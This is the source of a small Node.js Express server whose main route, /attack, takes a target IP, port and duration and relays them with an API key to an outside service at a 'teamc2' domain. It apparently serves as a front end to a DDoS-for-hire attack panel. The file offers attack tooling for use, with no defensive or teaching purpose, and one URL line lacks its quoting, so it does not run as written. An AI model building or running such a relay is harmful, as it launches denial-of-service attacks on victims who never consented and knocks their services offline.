require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

// 🔐 ENV
const API_KEY = process.env.API_KEY;

// ✅ PORT
const PORT = process.env.PORT || 5000;

// ✅ DEBUG (important)
process.on("uncaughtException", (err) => {
  console.error("UNCAUGHT ERROR:", err);
});

process.on("unhandledRejection", (err) => {
  console.error("UNHANDLED PROMISE:", err);
});

// ✅ ROOT (health check)
app.get("/", (req, res) => {
  res.status(200).send("API Running 🚀");
});

// ✅ TEST ROUTE (extra debug)
app.get("/test", (req, res) => {
  res.json({ msg: "Test OK" });
});

// ✅ MAIN API
app.post("/attack", async (req, res) => {
  try {
    const { ip, port, time } = req.body;

    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    if (!API_KEY) {
      return res.status(500).json({ error: "API key missing" });
    }

    const url = https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1;

    const response = await axios.get(url);

    res.json({ success: true, data: response.data });

  } catch (err) {
    console.error("ERROR:", err);
    res.status(500).json({ error: "Server error" });
  }
});

// ✅ LISTEN
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});